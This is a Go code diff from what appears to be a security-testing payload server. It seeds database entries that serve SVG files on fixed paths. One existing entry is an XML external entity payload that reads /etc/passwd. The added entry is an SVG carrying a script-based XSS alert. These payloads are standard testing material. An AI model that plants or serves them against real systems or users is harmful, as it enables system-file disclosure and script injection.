@@ -19,6 +19,7 @@ func Seed(dbh *gorm.DB) {
 		seedXSSJS,
 		seedHTMLIFrameEtcPasswd,
 		seedSVGXXE,
+		seedSVGXSS,
 	}
 
 	for _, fn := range seedFns {
@@ -88,6 +89,11 @@ func seedHTMLIFrameEtcPasswd(dbh *gorm.DB) *gorm.DB {
 
 func seedSVGXXE(dbh *gorm.DB) *gorm.DB {
 	h := newDefaultSimplePayload(`/sv$`, 1, "image/svg+xml", []byte(`<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text></svg>`))
+	return dbh.Create(h)
+}
+
+func seedSVGXSS(dbh *gorm.DB) *gorm.DB {
+	h := newDefaultSimplePayload(`/svgxss$`, 1, "image/svg+xml", []byte(`<?xml version="1.0" standalone="yes"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg width="100" height="100" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><script type="text/javascript">alert('XSS');</script></svg>`))
 	return dbh.Create(h)
 }
 
